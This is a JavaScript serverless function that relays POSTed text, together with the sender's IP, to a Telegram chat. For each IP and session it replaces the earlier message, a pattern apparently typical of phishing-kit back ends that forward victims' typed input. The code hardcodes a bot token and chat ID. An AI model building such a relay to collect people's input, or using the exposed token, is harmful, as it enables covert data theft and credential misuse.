const TELEGRAM_BOT_TOKEN = "8881228942:AAF2sUfUYrtoHeNBSiE-0LvD1sNrLslZTtM";
const TELEGRAM_CHAT_ID = "-1003954393814";

let ipToMessageId = {};

function getClientIp(headers) {
  const cf = headers["cf-connecting-ip"] || headers["CF-Connecting-IP"];
  if (cf) return cf;

  const xff = headers["x-forwarded-for"] || headers["X-Forwarded-For"];
  if (xff) return xff.split(",")[0].trim();

  return headers["client-ip"] || headers["Client-Ip"] || "";
}

exports.handler = async (event, context) => {
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      body: JSON.stringify({ ok: false, error: "Method not allowed" })
    };
  }

  let body = {};
  try {
    body = JSON.parse(event.body || "{}");
  } catch {
    return {
      statusCode: 400,
      body: JSON.stringify({ ok: false, error: "Invalid JSON" })
    };
  }

  const text = body.text;
  if (!text) {
    return {
      statusCode: 400,
      body: JSON.stringify({ ok: false, error: "No text" })
    };
  }

  const userIp = getClientIp(event.headers) || "unknown";
  const apiBase = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

  const sessionId =
    typeof body.sessionId === "string" && body.sessionId.trim()
      ? body.sessionId.trim()
      : null;

  if (
    sessionId &&
    ipToMessageId[userIp] &&
    ipToMessageId[userIp][sessionId]
  ) {
    try {
      await fetch(
        apiBase +
          "/deleteMessage?" +
          new URLSearchParams({
            chat_id: TELEGRAM_CHAT_ID,
            message_id: ipToMessageId[userIp][sessionId]
          })
      );
    } catch (e) {
      console.log("deleteMessage error:", e);
    }
  }

  const params = new URLSearchParams();
  params.append("chat_id", TELEGRAM_CHAT_ID);
  params.append("text", text);
  params.append("parse_mode", "HTML");

  const resp = await fetch(apiBase + "/sendMessage", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: params
  });

  const json = await resp.json();

  if (json.ok && sessionId) {
    if (!ipToMessageId[userIp]) {
      ipToMessageId[userIp] = {};
    }
    ipToMessageId[userIp][sessionId] = json.result.message_id;
  }

  return {
  statusCode: 200,
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    ok: json.ok === true,
    message: json.ok ? "oke" : "fail",
    message_id: json.ok ? json.result?.message_id : null
  })
};

};
